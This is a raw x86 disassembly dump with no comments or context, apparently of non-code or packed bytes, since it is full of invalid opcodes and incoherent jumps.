  4077e1:	(bad)  
  4077e2:	pop    ss
  4077e3:	or     edx,DWORD PTR [ebx]
  4077e5:	or     al,0xc0
  4077e7:	shl    BYTE PTR [ecx-0x6f],1
  4077ea:	mov    edx,0xfc281bca
  4077f0:	scas   eax,DWORD PTR es:[edi]
  4077f1:	or     eax,0x9994dabe
  4077f6:	das    
  4077f7:	shr    DWORD PTR [eax],cl
  4077f9:	xchg   BYTE PTR [edx],ch
  4077fb:	xor    al,0x3b
  4077fd:	xor    dl,al
  4077ff:	int    0x22
  407801:	stc    
  407802:	jne    0x407831
  407804:	push   0x1c
  407806:	pusha  
  407807:	ret    0x8d0b
  40780a:	jge    0x4077e7
  40780c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40780d:	sbb    ch,BYTE PTR [eax+0x4251a11a]
  407813:	or     ebx,DWORD PTR [eax]
  407815:	add    BYTE PTR ss:[ecx+0x16],0x7f
  40781a:	sub    BYTE PTR [esi],bh
  40781c:	sbb    eax,0x74d64ebe
  407821:	jecxz  0x4077e0
  407823:	rol    esp,1
  407825:	out    0xd3,eax
  407827:	push   edi
  407828:	mov    ch,0xfa
  40782a:	xchg   ebx,eax
  40782b:	sbb    eax,0x6a8a8776
  407830:	xor    eax,0xc71b06ae
  407835:	leave  
  407836:	cli    
  407837:	fwait
  407838:	ss push es
  40783a:	xlat   BYTE PTR ds:[ebx]
  40783b:	cmp    ah,BYTE PTR [eax-0x79434161]
  407841:	sub    ah,BYTE PTR [edx]
  407843:	push   ss
  407844:	hlt    
  407845:	cwde   
  407846:	int    0x74
  407848:	mov    bh,dh
  40784a:	nop
  40784b:	retf   
  40784c:	(bad)  
  40784d:	cwde   
  40784e:	lods   eax,DWORD PTR ds:[esi]
  40784f:	push   sp
  407851:	jnp    0x407884
  407853:	retf   0x363d
  407856:	test   DWORD PTR [esi-0x192a0935],esi
  40785c:	sub    cx,cx
  40785f:	retf   0x7179
  407862:	push   cs
  407863:	sti    
  407864:	fisttp DWORD PTR [ebx+0x7e]
  407867:	ja     0x407815
  407869:	addr16 jo 0x407877
  40786c:	xor    DWORD PTR [edx+0x3bff442],edx
  407872:	out    0x1a,al
  407874:	loopne 0x4078d6
  407876:	cwde   
  407877:	push   edi
  407878:	fs mov edi,0x2b957fc1
  40787e:	jle    0x40785b
  407880:	mov    cl,BYTE PTR [edi-0x5f]
  407883:	rol    DWORD PTR [ebp+0x320f8b30],0xd4
  40788a:	stos   BYTE PTR es:[edi],al
  40788b:	xchg   edx,eax
  40788c:	push   edx
  40788d:	mov    ebp,0x24c69311
  407892:	inc    edi
  407893:	out    0xbf,al
  407895:	xor    BYTE PTR [eax],ch
  407897:	jmp    0x59577a15
  40789c:	pop    ecx
  40789d:	in     al,0xb7
  40789f:	adc    cl,BYTE PTR [eax+0x297c505a]
  4078a5:	fisttp QWORD PTR [ebx+ecx*8-0x6a]
  4078a9:	push   0xb6625b46
  4078ae:	push   ss
  4078af:	outs   dx,DWORD PTR ds:[esi]
  4078b0:	mov    ah,0x98
  4078b2:	push   ss
  4078b3:	xor    al,0x65
  4078b5:	call   0x77d05b00
  4078ba:	js     0x407886
  4078bc:	test   DWORD PTR [edx+0x39427c1a],ebx
  4078c2:	and    DWORD PTR [ecx+0x48af08de],edi
  4078c8:	jae    0x407864
  4078ca:	mov    ebp,0x12ea959b
  4078cf:	(bad)
  4078d2:	inc    ebp
  4078d3:	ja     0x407919
  4078d5:	iret   
  4078d6:	mov    bl,0x70
  4078d8:	sti    
  4078d9:	fisttp WORD PTR [edx-0x725d745d]
  4078df:	pop    esi
  4078e0:	ret    0xb943
  4078e3:	clc    
  4078e4:	sub    BYTE PTR [edx],0x7a
  4078e7:	fisub  DWORD PTR [edi-0x4d]
  4078ea:	inc    ebx
  4078eb:	inc    ebp
  4078ec:	mov    bh,0x17
  4078ee:	mov    ch,0xd9
  4078f0:	xor    ebx,DWORD PTR [esi+0xa270378]
  4078f6:	pop    ebp
  4078f7:	cdq    
  4078f8:	sub    ebx,ebx
  4078fa:	adc    BYTE PTR [ecx],bl
  4078fc:	sub    eax,0xdca82eba
  407901:	sahf   
  407902:	inc    ebp
  407903:	mov    bh,0xca
  407905:	pop    DWORD PTR cs:[ebp-0x358c21be]
  40790c:	popf   
  40790d:	sbb    edx,DWORD PTR [ebp-0x4d]
  407910:	call   0x8350:0xabf82b7e
  407917:	je     0x40795a
  407919:	push   ds
  40791a:	add    al,0xa6
  40791c:	sub    al,0x45
  40791e:	je     0x4078be
  407920:	jnp    0x407971
  407922:	sbb    al,0x67
  407924:	iret   
  407925:	repz dec esi
  407927:	mov    eax,0x6f1d1dd6
  40792c:	mov    esp,DWORD PTR [ebx+ecx*2+0x32]
  407930:	loopne 0x4078cf
  407932:	sbb    eax,DWORD PTR [ebx*8+0x381f23ef]
  407939:	dec    esp
  40793a:	loopne 0x4078d9
  40793c:	stos   DWORD PTR es:[edi],eax
  40793d:	cmc    
  40793e:	cwde   
  40793f:	sub    al,0x54
  407941:	stos   BYTE PTR es:[edi],al
  407942:	sti    
  407943:	mov    edx,0xec56faf5
  407948:	jae    0x40798c
  40794a:	adc    eax,0x27a98fea
  40794f:	push   0xffffff93
  407951:	mov    ds:0xbf012324,eax
  407956:	in     al,dx
  407957:	add    eax,0x76be9704
  40795c:	fdivr  DWORD PTR [ecx+ebp*4-0x46a69af6]
  407963:	jmp    0xbd36:0xdfcf2359
  40796a:	jmp    0xa62cc292
  40796f:	jo     0x407982
  407971:	rcl    DWORD PTR [ebx],1
  407973:	inc    ecx
  407974:	lahf   
  407975:	cmp    ah,dh
  407977:	cmc    
  407978:	int3   
  407979:	in     eax,0xd0
  40797b:	or     al,0xd0
  40797d:	push   ebp
  40797e:	js     0x4079ea
  407980:	push   ss
  407981:	and    ah,BYTE PTR [ebx-0x1b]
  407984:	and    eax,0xafaeea29
  407989:	fwait
  40798a:	ins    DWORD PTR es:[edi],dx
  40798b:	in     eax,dx
  40798c:	jnp    0x407935
  40798e:	add    cl,BYTE PTR [esi+0x472000aa]
  407994:	sbb    eax,0x25be0ad
  407999:	pushf  
  40799a:	add    DWORD PTR [edi-0xa32728c],esi
  4079a0:	push   es
  4079a1:	(bad)  [ebx]
  4079a3:	(bad)  
  4079a4:	and    al,0x26
  4079a6:	mov    al,0x22
  4079a8:	stos   BYTE PTR es:[edi],al
  4079a9:	popa   
  4079aa:	dec    esi
  4079ab:	mov    al,0x6f
  4079ad:	adc    BYTE PTR [esi+0x1c6c4e56],ch
  4079b3:	pop    esi
  4079b4:	add    al,BYTE PTR [ebx]
  4079b6:	es jg  0x4079ad
  4079b9:	add    edx,DWORD PTR [esi+ebx*1]
  4079bc:	xor    ebp,esi
  4079be:	xchg   esi,eax
  4079bf:	sub    cl,bl
  4079c1:	leave  
  4079c2:	loopne 0x4079b1
  4079c4:	clc    
  4079c5:	sar    BYTE PTR [esi],0xd4
  4079c8:	enter  0x94ba,0x1d
  4079cc:	sahf   
  4079cd:	and    edi,DWORD PTR [ebx]
  4079cf:	add    ebp,DWORD PTR [edx-0x52713f24]
  4079d5:	pop    eax
  4079d6:	leave  
  4079d7:	mov    BYTE PTR [ebx+esi*2],ah
  4079da:	test   al,0x51
  4079dc:	loopne 0x40797c
  4079de:	dec    ebp
  4079df:	xor    cl,BYTE PTR [edi]
  4079e1:	fcomp  DWORD PTR [edx+0x2c]
  4079e4:	(bad)  
  4079e5:	loopne 0x40798e
  4079e7:	mov    cl,0xe3
  4079e9:	dec    ebp
  4079ea:	ins    BYTE PTR es:[edi],dx
  4079eb:	push   edx
  4079ec:	jb     0x4079c6
  4079ee:	jmp    0xcb37:0xdd405e88
  4079f5:	pop    ebx
  4079f6:	dec    eax
  4079f7:	fstp   st(6)
  4079f9:	cmp    eax,0x945647ed
  4079fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079ff:	xlat   BYTE PTR ds:[ebx]
  407a00:	sub    BYTE PTR [ebx+esi*8-0x30],dh
  407a04:	out    0x1c,al
  407a06:	out    dx,al
  407a07:	mov    ?,ebp
  407a09:	xor    BYTE PTR [edx+0x5415051f],0x1a
  407a10:	je     0x407a04
  407a12:	out    dx,eax
  407a13:	dec    edx
  407a14:	sbb    al,0x90
  407a16:	mov    edi,edi
  407a18:	ret    
  407a19:	sar    DWORD PTR [esi+ecx*4],1
  407a1c:	fistp  WORD PTR [ebx]
  407a1e:	out    0x46,eax
  407a20:	mov    ss,WORD PTR [ebx+ebp*1]
  407a23:	dec    eax
  407a24:	sub    dh,dh
  407a26:	fwait
  407a27:	iret   
  407a28:	pop    ebx
  407a29:	jge    0x407a60
  407a2b:	xor    al,BYTE PTR [esi+edx*2-0x40]
  407a2f:	and    ebp,DWORD PTR [ebp-0x67cafcd6]
  407a35:	mov    ch,0x6f
  407a37:	dec    ebp
  407a38:	fstp   DWORD PTR [edx]
  407a3a:	and    al,0x2c
  407a3c:	mov    ebx,0xb57436cd
  407a41:	les    ebx,FWORD PTR [ebx+0x78e6c1bf]
  407a47:	sub    DWORD PTR [ecx+0x302a5a55],edi
  407a4d:	lods   eax,DWORD PTR ds:[esi]
  407a4e:	mov    ebp,0x9fec0a15
  407a53:	adc    DWORD PTR [ebx+0x74],ebp
  407a56:	xlat   BYTE PTR ds:[ebx]
  407a57:	shr    DWORD PTR [eax+0x18b92ec],cl
  407a5d:	pusha  
  407a5e:	jg     0x407a65
  407a60:	fldenv [ebx]
  407a62:	xor    eax,0x652e3073
  407a67:	das    
  407a68:	lods   eax,DWORD PTR ds:[esi]
  407a69:	mov    bh,0x5
  407a6b:	dec    eax
  407a6c:	nop
  407a6d:	and    cl,BYTE PTR [edi-0x74]
  407a70:	cmp    eax,0xb40595fa
  407a75:	xor    al,BYTE PTR ds:0x1d8a2090
  407a7b:	aaa    
  407a7c:	js     0x407a49
  407a7e:	and    eax,0xb631b99b
  407a83:	sub    al,0xf6
  407a85:	jb     0x407a7c
  407a87:	fstp   TBYTE PTR [ebx]
  407a89:	inc    esi
  407a8a:	sahf   
  407a8b:	mov    ch,0xc1
  407a8d:	dec    esp
  407a8e:	into   
  407a8f:	das    
  407a90:	inc    esp
  407a91:	inc    edx
  407a92:	outs   dx,BYTE PTR ds:[esi]
  407a93:	in     al,dx
  407a94:	rcl    cl,0x70
  407a97:	mov    edx,0xb756b77c
  407a9c:	xchg   ebx,eax
  407a9d:	sbb    esi,DWORD PTR [ebx+0x2fbb22d7]
  407aa3:	mov    esi,0x36f42b0a
  407aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aa9:	aaa    
  407aaa:	aad    0x7c
  407aac:	pop    ss
  407aad:	xlat   BYTE PTR ds:[ebx]
  407aae:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407ab0:	cmp    DWORD PTR [edx],ecx
  407ab2:	and    edi,DWORD PTR [ebx-0x6bd3d52e]
  407ab8:	sahf   
  407ab9:	jmp    0xd352:0x22c07a37
  407ac0:	sbb    eax,0x24f5285a
  407ac5:	iret   
  407ac6:	fidiv  WORD PTR [edx+0x2e]
  407ac9:	push   0x26ae85a2
  407ace:	or     al,0xb5
  407ad0:	stc    
  407ad1:	out    0xfc,al
  407ad3:	fnstenv [edx]
  407ad5:	xchg   esi,eax
  407ad6:	adc    eax,0xc69d6f1f
  407adb:	std    
  407adc:	mov    ah,bh
  407ade:	imul   al
  407ae0:	mov    ebp,0x8ec06cca
  407ae5:	xchg   ebp,eax
  407ae6:	xor    al,0xbe
  407ae8:	loope  0x407a76
  407aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aeb:	mov    ecx,0x5c476dd9
  407af0:	and    ebx,ebx
  407af2:	sub    BYTE PTR [edi+0x243871fc],dh
  407af8:	in     eax,dx
  407af9:	or     DWORD PTR [ebp-0x71460a37],eax
  407aff:	lock sub edx,DWORD PTR [ebx-0x3a]
  407b03:	jmp    0x76e98267
  407b08:	pop    esp
  407b09:	inc    ebp
  407b0a:	adc    esi,DWORD PTR [esi]
  407b0c:	push   esi
  407b0d:	sub    BYTE PTR cs:[ebp*8-0xdfa7a20],0xe8
  407b16:	jl     0x407a9c
  407b18:	out    dx,eax
  407b19:	cli    
  407b1a:	inc    ebx
  407b1b:	jmp    0x407b14
  407b1d:	mov    ebp,0x1a6e0cc1
  407b22:	xchg   edi,eax
  407b23:	ins    BYTE PTR es:[edi],dx
  407b24:	pop    ds
  407b25:	mov    WORD PTR [esi+0x6e8eac6b],ds
  407b2b:	or     BYTE PTR [ebx+0x2289face],ch
  407b31:	sar    DWORD PTR [ebp-0x24],0x63
  407b35:	cmp    ecx,DWORD PTR [ebx+eiz*8+0x6b]
  407b39:	push   eax
  407b3a:	mov    esp,0xa377950c
  407b3f:	outs   dx,DWORD PTR ds:[esi]
  407b40:	add    edi,0xffffffa2
  407b43:	cmp    DWORD PTR [ebx-0x3],esi
  407b46:	cmp    eax,ebx
  407b48:	in     eax,dx
  407b49:	mov    ah,ch
  407b4b:	mov    eax,ds:0x92fe5484
  407b50:	and    ch,BYTE PTR [esi-0x78]
  407b53:	and    eax,0xfc64c37
  407b58:	cli    
  407b59:	outs   dx,DWORD PTR ds:[esi]
  407b5a:	pop    ebx
  407b5b:	mov    esp,DWORD PTR [ebx+esi*8+0x24a4b2d0]
  407b62:	jg     0x407bc8
  407b64:	ja     0x407b76
  407b66:	popf   
  407b67:	adc    eax,0x5bf79a8e
  407b6c:	xchg   DWORD PTR [eax-0x5d],esi
  407b6f:	mov    eax,ds:0xe4470484
  407b74:	das    
  407b75:	dec    edi
  407b76:	lea    ebp,[edx]
  407b78:	pop    edi
  407b79:	shl    BYTE PTR [esi+0x7865f8d7],0xee
  407b80:	jp     0x407b76
  407b82:	(bad)  
  407b83:	retf   
  407b84:	loopne 0x407bd8
  407b86:	stc    
  407b87:	xlat   BYTE PTR ds:[ebx]
  407b88:	in     eax,0xc9
  407b8a:	and    BYTE PTR [esi+0x332a946e],dl
  407b90:	out    0xb9,eax
  407b92:	cdq    
  407b93:	add    al,0x83
  407b95:	aam    0x1d
  407b97:	loopne 0x407c18
  407b99:	ins    DWORD PTR es:[edi],dx
  407b9a:	in     al,0x75
  407b9c:	xchg   esi,eax
  407b9d:	test   BYTE PTR [esi+0x1ed22014],bh
  407ba3:	cmc    
  407ba4:	dec    edx
  407ba5:	xchg   BYTE PTR [edi],ch
  407ba7:	cs repz xchg ecx,eax
  407baa:	inc    ebp
  407bab:	int    0x7
  407bad:	je     0x407b8c
  407baf:	or     bl,BYTE PTR [ecx-0x3706efef]
  407bb5:	push   edi
  407bb6:	and    eax,DWORD PTR [eax]
  407bb8:	adc    DWORD PTR [ebx-0x47],edi
  407bbb:	mov    ebx,0x96ce9ec3
  407bc0:	fwait
  407bc1:	mov    eax,ds:0xcaf48095
  407bc6:	pop    ds
  407bc7:	int3   
  407bc8:	xchg   esi,eax
  407bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bca:	mov    edi,0x431b7fdc
  407bcf:	test   al,0xe
  407bd1:	mov    ecx,DWORD PTR [eax-0x59c66f34]
  407bd7:	mov    eax,0x4a85904f
  407bdc:	pop    esp
  407bdd:	and    DWORD PTR [esi+0x43e4d6a5],0x43
  407be4:	hlt    
  407be5:	(bad)  
  407be6:	hlt    
  407be7:	pop    ecx
  407be8:	rcr    BYTE PTR [ecx-0x17],cl
  407beb:	pop    eax
  407bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bed:	repnz sub al,0xc2
  407bf0:	retf   0x4986
  407bf3:	jecxz  0x407b79
  407bf5:	(bad)  
  407bf6:	or     al,0x30
  407bf8:	test   BYTE PTR [ecx+0x36],0x91
  407bfc:	js     0x407bf3
  407bfe:	push   0x339f0b3e
  407c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c04:	sub    BYTE PTR [edx+0x75920182],dl
  407c0a:	mov    DWORD PTR [ecx-0x7d],edx
  407c0d:	je     0x407c41
  407c0f:	jns    0x407be9
  407c11:	dec    esi
  407c12:	or     al,ch
  407c14:	or     BYTE PTR [eax-0xb8f2b5f],dl
  407c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c1b:	lock inc ebp
  407c1d:	mov    eax,gs
  407c1f:	pop    edx
  407c20:	bound  ebp,QWORD PTR [ebx+0xa6e63fb]
  407c26:	fisub  DWORD PTR [ecx]
  407c28:	loopne 0x407ca5
  407c2a:	cmp    DWORD PTR [eax+0x28982f3a],ecx
  407c30:	jae    0x407c5d
  407c32:	add    dh,BYTE PTR [edx]
  407c34:	test   al,0xaa
  407c36:	sub    esp,DWORD PTR [edi]
  407c38:	xchg   BYTE PTR [ecx+0x363c5d70],al
  407c3e:	popf   
  407c3f:	and    edx,DWORD PTR [edx-0x77]
  407c42:	add    BYTE PTR [esp+edx*8+0x3e206734],dh
  407c49:	inc    esp
  407c4a:	lea    edx,[edi-0x3b]
  407c4d:	call   0xa76:0xefe8bd90
  407c54:	scas   al,BYTE PTR es:[edi]
  407c55:	adc    al,0x7a
  407c57:	dec    esi
  407c58:	mov    ?,esi
  407c5a:	xor    al,0x17
  407c5c:	xor    DWORD PTR [edx+0x33411656],eax
  407c62:	and    esp,DWORD PTR [eax]
  407c64:	cmp    BYTE PTR [eax+0x74],ch
  407c67:	jns    0x407bf6
  407c69:	test   al,0xeb
  407c6b:	test   eax,0x9170a4cd
  407c70:	shl    dl,0xba
  407c73:	xchg   esp,eax
  407c74:	jne    0x407c52
  407c76:	bnd jae 0x407ce9
  407c79:	je     0x407c2f
  407c7b:	jg     0x407c8a
  407c7d:	pop    es
  407c7e:	push   esp
  407c7f:	and    bh,BYTE PTR [esi-0x34bee1e2]
  407c85:	rcr    DWORD PTR [edi-0x6b],cl
  407c88:	jmp    0x407cd6
  407c8a:	sub    DWORD PTR [eax-0x78],ecx
  407c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c8f:	mov    ebx,0xefc6f59
  407c94:	ja     0x407ce4
  407c96:	data16 jo 0x407ce4
  407c99:	xor    eax,0x2911be8c
  407c9e:	pop    ebx
  407c9f:	dec    ecx
  407ca0:	rcr    BYTE PTR [eax-0x717577b6],cl
  407ca6:	neg    BYTE PTR [esi+0x0]
  407ca9:	enter  0xee0a,0x73
  407cad:	adc    DWORD PTR [ebp-0x61],ebp
  407cb0:	or     ch,ah
  407cb2:	sub    al,0x4c
  407cb4:	je     0x407cdd
  407cb6:	call   0x5aad:0x5187f7f2
  407cbd:	mov    ebx,0x9bbf329
  407cc2:	push   0xdfea5337
  407cc7:	adc    DWORD PTR [ebp+0x70],esp
  407cca:	cmc    
  407ccb:	push   edx
  407ccc:	jmp    0xe5c3:0x94d671a8
  407cd3:	inc    ecx
  407cd4:	test   eax,0xce4cb0aa
  407cd9:	mov    eax,ds:0x988640d4
  407cde:	in     eax,0x9d
  407ce0:	dec    esp
  407ce1:	and    dh,ah
  407ce3:	jp     0x407d09
  407ce5:	or     DWORD PTR [ebx+0x421727e3],ebx
  407ceb:	mov    cl,0x6c
  407ced:	pop    ds
  407cee:	mul    DWORD PTR [eax+0x2af95907]
  407cf4:	mov    al,ds:0x8008940
  407cf9:	cmp    al,BYTE PTR ds:0x1358bb76
  407cff:	mov    ch,0x11
  407d01:	jnp    0x407c9e
  407d03:	mov    WORD PTR [edx-0x58],fs
  407d06:	pushf  
  407d07:	xor    al,0xf6
  407d09:	mov    cl,0x26
  407d0b:	fstp   DWORD PTR [edx+eax*4-0x36]
  407d0f:	inc    esi
  407d10:	into   
  407d11:	dec    ecx
  407d12:	ja     0x407cf6
  407d14:	mov    eax,DWORD PTR [ecx+0x16]
  407d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d18:	and    eax,0xeb9780b1
  407d1d:	mov    ecx,0x34002ff8
  407d22:	fdivrp st(0),st
  407d24:	add    al,0x42
  407d26:	dec    eax
  407d27:	inc    ebx
  407d28:	push   esi
  407d29:	pop    ss
  407d2a:	mov    ebp,0x86b38934
  407d2f:	inc    edi
  407d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d31:	jns    0x407d16
  407d33:	push   ebx
  407d34:	outs   dx,BYTE PTR ds:[esi]
  407d35:	(bad)  
  407d36:	clc    
  407d37:	scas   al,BYTE PTR es:[edi]
  407d38:	jecxz  0x407d8b
  407d3a:	je     0x407cce
  407d3c:	sub    bh,BYTE PTR [ecx-0x655744be]
  407d42:	imul   DWORD PTR [edx]
  407d44:	mov    WORD PTR [esi-0x2bf7408f],ss
  407d4a:	sub    esp,DWORD PTR [esi-0x2af0d7f1]
  407d50:	(bad)  
  407d51:	adc    BYTE PTR [edi+0x6a],ah
  407d54:	xchg   edx,eax
  407d55:	icebp  
  407d56:	adc    al,0xa8
  407d58:	cmp    esp,DWORD PTR [edi-0x37]
  407d5b:	push   eax
  407d5c:	fidivr DWORD PTR [edx-0x38]
  407d5f:	push   esp
  407d60:	dec    ecx
  407d61:	push   0x5997954a
  407d66:	stc    
  407d67:	dec    ebp
  407d68:	push   ebx
  407d69:	neg    DWORD PTR [ebp+0x54a5f1f9]
  407d6f:	and    eax,0xa72244f5
  407d74:	mov    ebp,0xced926b6
  407d79:	int3   
  407d7a:	and    BYTE PTR cs:[eax+eax*4-0x12e1913b],bh
  407d82:	mov    eax,0xb4e923c5
  407d87:	xchg   esi,eax
  407d88:	mov    BYTE PTR [eax],al
  407d8a:	push   esi
  407d8b:	sub    DWORD PTR [ebp+0x4e5a8b93],esp
  407d91:	xchg   ebx,eax
  407d92:	pop    ecx
  407d93:	cmp    dh,bh
  407d95:	mov    dl,bl
  407d97:	adc    DWORD PTR [ecx+edi*4-0x62c90825],eax
  407d9e:	(bad)  
  407d9f:	sbb    edi,DWORD PTR [eax]
  407da1:	repz mov al,ds:0x1d6f19b5
  407da7:	and    ecx,DWORD PTR [ecx-0x70]
  407daa:	sbb    al,0x50
  407dac:	pop    DWORD PTR [edx-0x61fbfafb]
  407db2:	add    DWORD PTR [ecx-0x28],0x27fc2155
  407db9:	dec    ecx
  407dba:	xchg   esi,eax
  407dbc:	push   ds
  407dbd:	cdq    
  407dbe:	data16 (bad) 
  407dc0:	sub    al,0x0
  407dc2:	fs aam 0x2c
  407dc5:	xchg   esp,eax
  407dc6:	xchg   esp,eax
  407dc7:	mov    bh,0x42
  407dc9:	loopne 0x407df5
  407dcb:	push   es
  407dcc:	out    dx,al
  407dcd:	inc    eax
  407dce:	mov    bl,0x3b
  407dd0:	scas   eax,DWORD PTR es:[edi]
  407dd1:	iret   
  407dd2:	(bad)  
  407dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd4:	cmp    eax,0xdb485de5
  407dd9:	sub    eax,DWORD PTR [ebx+0x5436856e]
  407ddf:	loop   0x407d9f
  407de1:	pop    edx
  407de3:	push   es
  407de4:	adc    al,0x29
  407de6:	fs dec eax
  407de8:	or     DWORD PTR [edi],ecx
  407dea:	shl    DWORD PTR [esi-0x4b831680],cl
  407df0:	fsubr  DWORD PTR [edx+0x43]
  407df3:	xlat   BYTE PTR ds:[ebx]
  407df4:	lods   al,BYTE PTR ds:[esi]
  407df5:	aad    0xb3
  407df7:	push   0xd88c4a36
  407dfc:	sbb    al,0x3b
  407dfe:	fs stc 
  407e00:	ret    0xe311
  407e03:	mov    dh,0x59
  407e05:	imul   esp,DWORD PTR [ebx+0xda6364a],0xffffffd0
  407e0c:	nop
  407e0d:	js     0x407e86
  407e0f:	sub    cl,0x26
  407e12:	mov    bl,0xca
  407e14:	fist   WORD PTR [edi]
  407e16:	sbb    eax,0xf652dbe2
  407e1b:	xchg   edx,eax
  407e1c:	inc    esp
  407e1d:	adc    esp,DWORD PTR [ebp-0xe]
  407e20:	lahf   
  407e21:	sub    DWORD PTR [esi-0x25772c90],ecx
  407e27:	mov    al,0xd0
  407e29:	and    BYTE PTR [esi],ah
  407e2b:	push   0xc25256b8
  407e30:	in     al,dx
  407e31:	add    DWORD PTR [esi+0xf],edx
  407e34:	(bad)  
  407e35:	mov    ds:0xb2886a82,al
  407e3a:	lea    esi,[ebx-0x3817352]
  407e40:	add    BYTE PTR [ebp+0x331398bc],cl
  407e46:	aam    0xf4
  407e48:	fisubr WORD PTR [ebp+0x63]
  407e4b:	xchg   ebp,eax
  407e4c:	xor    cl,0x86
  407e4f:	jnp    0x407e26
  407e51:	test   BYTE PTR [edi+0x2eaf3d4],ah
  407e57:	enter  0x31cf,0x85
  407e5b:	shl    ebx,cl
  407e5d:	ror    bl,0xf6
  407e60:	js     0x407e3d
  407e62:	in     eax,0x29
  407e64:	retf   
  407e65:	(bad)  
  407e66:	mul    DWORD PTR [ecx-0x19bc2856]
  407e6c:	xchg   DWORD PTR [ebp+0x7f83adc0],eax
  407e72:	test   al,0x37
  407e74:	fxch   st(0)
  407e76:	xor    ah,dl
  407e78:	ins    DWORD PTR es:[edi],dx
  407e79:	ret    
  407e7a:	and    eax,0x56b3a6c4
  407e7f:	pop    edi
  407e80:	inc    ebp
  407e81:	test   DWORD PTR ds:0xc3252d2d,0xf27f8848
  407e8b:	jmp    0xfd05:0x82590058
  407e92:	and    esi,ebx
  407e94:	jle    0x407f0b
  407e96:	fsubr  QWORD PTR [edi-0x290d9991]
  407e9c:	popf   
  407e9d:	lods   eax,DWORD PTR ds:[esi]
  407e9e:	test   BYTE PTR [esi],0x27
  407ea1:	jne    0x407f1b
  407ea3:	cmc    
  407ea4:	sub    DWORD PTR [ebx-0x57],ebp
  407ea7:	xchg   edx,eax
  407ea8:	jns    0x407eb1
  407eaa:	sbb    ch,BYTE PTR [edi-0x50c38aa9]
  407eb0:	ret    
  407eb1:	jno    0x407ec8
  407eb3:	ret    
  407eb4:	iret   
  407eb5:	out    dx,eax
  407eb6:	or     DWORD PTR [edi-0x2f],esp
  407eb9:	adc    DWORD PTR [eax],ecx
  407ebb:	xchg   ebx,eax
  407ebc:	scas   eax,DWORD PTR es:[edi]
  407ebd:	inc    eax
  407ebe:	cld    
  407ebf:	in     al,0x77
  407ec1:	inc    ecx
  407ec2:	outs   dx,BYTE PTR ds:[esi]
  407ec3:	mov    eax,0xb57c6be9
  407ec8:	aad    0x3f
  407eca:	mov    edx,0xae1b7128
  407ecf:	icebp  
  407ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed1:	xor    cl,BYTE PTR [esi-0x6db038a]
  407ed7:	push   ss
  407ed8:	adc    eax,ebx
  407eda:	pop    edx
  407edb:	and    DWORD PTR [ebx-0x7af98420],0x40007a4e
  407ee5:	(bad)  
  407ee6:	push   ebx
  407ee7:	fnstsw WORD PTR [edi-0x1a31900b]
  407eed:	jmp    FWORD PTR [esi+ecx*2]
  407ef0:	es aas 
  407ef2:	enter  0x5059,0x16
  407ef6:	aaa    
  407ef7:	sahf   
  407ef8:	lock fistp QWORD PTR [bx-0x2f79]
  407efe:	ins    DWORD PTR es:[edi],dx
  407eff:	inc    ecx
  407f00:	es jbe 0x407e8e
  407f03:	ret    0xbce9
  407f06:	inc    ecx
  407f07:	mov    al,cl
  407f09:	loope  0x407ebe
  407f0b:	sbb    al,0x8b
  407f0d:	sbb    esp,DWORD PTR [esi-0x79e204a8]
  407f13:	adc    al,0x27
  407f15:	leave  
  407f16:	test   al,0x48
  407f18:	(bad)  
  407f19:	cmp    ebp,DWORD PTR [edi-0x20]
  407f1c:	ror    BYTE PTR [esi],1
  407f1e:	pop    ecx
  407f1f:	addr16 pushf 
  407f21:	xor    BYTE PTR [eax+0x19],0x67
  407f25:	sbb    al,0xda
  407f27:	imul   ecx,DWORD PTR [edi+0x2935e65],0x6a
  407f2e:	stos   BYTE PTR es:[edi],al
  407f2f:	js     0x407fa1
  407f31:	pop    ds
  407f32:	(bad)  
  407f33:	leave  
  407f34:	adc    edi,0xffffffdb
  407f37:	lods   eax,DWORD PTR ss:[esi]
  407f39:	push   ebp
  407f3a:	les    ebp,FWORD PTR [eax]
  407f3c:	xchg   ecx,eax
  407f3d:	frstpm(287 only) 
  407f3f:	jecxz  0x407ee9
  407f41:	bound  ebx,QWORD PTR [esi+0x11]
  407f44:	add    BYTE PTR [eax],al
  407f46:	jmp    0xcce7:0x7eded607
  407f4d:	pop    es
  407f4e:	in     eax,dx
  407f4f:	sbb    DWORD PTR ds:0xb35ad2ed,ecx
  407f55:	sti    
  407f56:	or     eax,0x4ba6ce52
  407f5b:	sbb    DWORD PTR [ecx],esi
  407f5d:	xor    edi,DWORD PTR [ecx+0x76926982]
  407f63:	jb     0x407fd9
  407f65:	iret   
  407f66:	in     al,dx
  407f67:	addr16 ret 0x9606
  407f6b:	fistp  DWORD PTR [ecx]
  407f6d:	add    dl,al
  407f6f:	sbb    al,dl
  407f71:	push   esp
  407f72:	cdq    
  407f73:	dec    ebx
  407f74:	daa    
  407f75:	sbb    eax,0xbb50d557
  407f7a:	jecxz  0x407f5c
  407f7c:	pop    es
  407f7d:	mov    bh,0x9c
  407f7f:	fdivr  st(6),st
  407f81:	imul   ecx,DWORD PTR [ebx-0x75b14e27],0x5e
  407f88:	pop    esp
  407f89:	shl    BYTE PTR [eax+0x66174fa9],1
  407f8f:	shl    DWORD PTR [esi-0x6c0150d0],1
  407f95:	jbe    0x407ff8
  407f97:	bswap  edi
  407f99:	mov    ecx,0x6c3e9101
  407f9e:	or     eax,0x2ea632ef
  407fa3:	jbe    0x408010
  407fa5:	cmp    ebp,DWORD PTR [esi]
  407fa7:	jns    0x407f62
  407fa9:	mov    ds:0xab2fbf91,al
  407fae:	xchg   edi,eax
  407faf:	jmp    0xf44edd06
